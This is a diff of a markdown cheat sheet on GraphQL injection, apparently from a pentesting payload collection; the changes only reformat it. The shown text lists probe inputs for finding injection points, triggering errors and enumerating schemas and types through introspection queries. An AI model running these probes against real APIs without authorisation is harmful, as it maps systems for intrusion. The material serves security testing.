@@ -1,17 +1,17 @@
 # GraphQL injection
 
-GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data.
+> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data.
 
 ## Exploit
 
 Identify an injection point
 
-```
+```javascript
 ?param={__schema{types{name}}}
 ```
 Check if errors are visible
 
-```
+```javascript
 ?param={__schema}
 ?param={}
 ?param={thisdefinitelydoesnotexist}
@@ -19,7 +19,7 @@ Check if errors are visible
 
 Enumerate Database Schema with the following GraphQL query
 
-```
+```javascript
 fragment FullType on __Type {
   kind
   name
@@ -119,7 +119,7 @@ query IntrospectionQuery {
 
 Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
 
-```
+```javascript
 {__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
 ```
 
